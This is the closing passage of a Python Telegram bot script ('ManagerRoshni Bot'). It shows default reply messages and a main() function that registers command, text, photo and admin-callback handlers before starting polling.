    if state == "SYSTEM_CHECKING":
        await update.message.reply_text("⚙️ system is checking wait carefully")
        return

    # ✅ FINAL DEFAULT MESSAGE
    await update.message.reply_text(
        "⚠️ Please follow the steps carefully.\n\n"
        "📌 Use the available buttons to continue."
    )


# -------------------- MAIN --------------------

def main():
    app = Application.builder().token(TOKEN).read_timeout(120).write_timeout(120).connect_timeout(120).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("unban", unban_command))

    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(CallbackQueryHandler(admin_response))

    print("🤖 ManagerRoshni Bot is running...")
    app.run_polling()


if __name__ == "__main__":
    main()
